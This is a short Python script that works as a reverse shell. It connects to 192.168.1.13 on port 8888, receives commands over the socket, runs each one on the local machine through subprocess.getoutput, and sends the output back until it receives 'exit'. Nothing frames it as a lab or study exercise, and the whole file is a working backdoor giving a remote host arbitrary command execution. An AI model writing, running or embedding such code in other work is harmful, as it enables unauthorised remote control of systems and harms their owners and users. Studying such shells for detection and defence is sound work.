import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.13', 8888))


while True:
	command = s.recv(1024).decode()
	if command.lower() == 'exit':
		break
	output = subprocess.getoutput(command)
	s.send(output.encode())
s.close()